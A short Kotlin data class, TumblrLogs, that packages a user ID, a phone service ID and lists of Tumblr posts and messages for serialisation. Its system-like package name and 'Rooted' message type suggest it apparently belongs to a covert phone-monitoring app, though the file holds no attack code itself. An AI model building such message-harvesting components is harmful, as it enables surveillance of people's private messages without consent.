package com.android.services.models.im

import com.android.services.db.entities.TumblrMessageRooted
import com.android.services.db.entities.TumblrPost
import com.google.gson.annotations.SerializedName

class TumblrLogs {

    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("tumblrPosts")
    var tumblrPostList: List<TumblrPost>? = null
        private set

    @SerializedName("tumblrMessages")
    var tumblrMessageList: List<TumblrMessageRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        tumblrPostList: List<TumblrPost>?,
        tumblrUnrootedList: List<TumblrMessageRooted>?,
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.tumblrPostList = tumblrPostList
        tumblrMessageList = tumblrUnrootedList
    }
}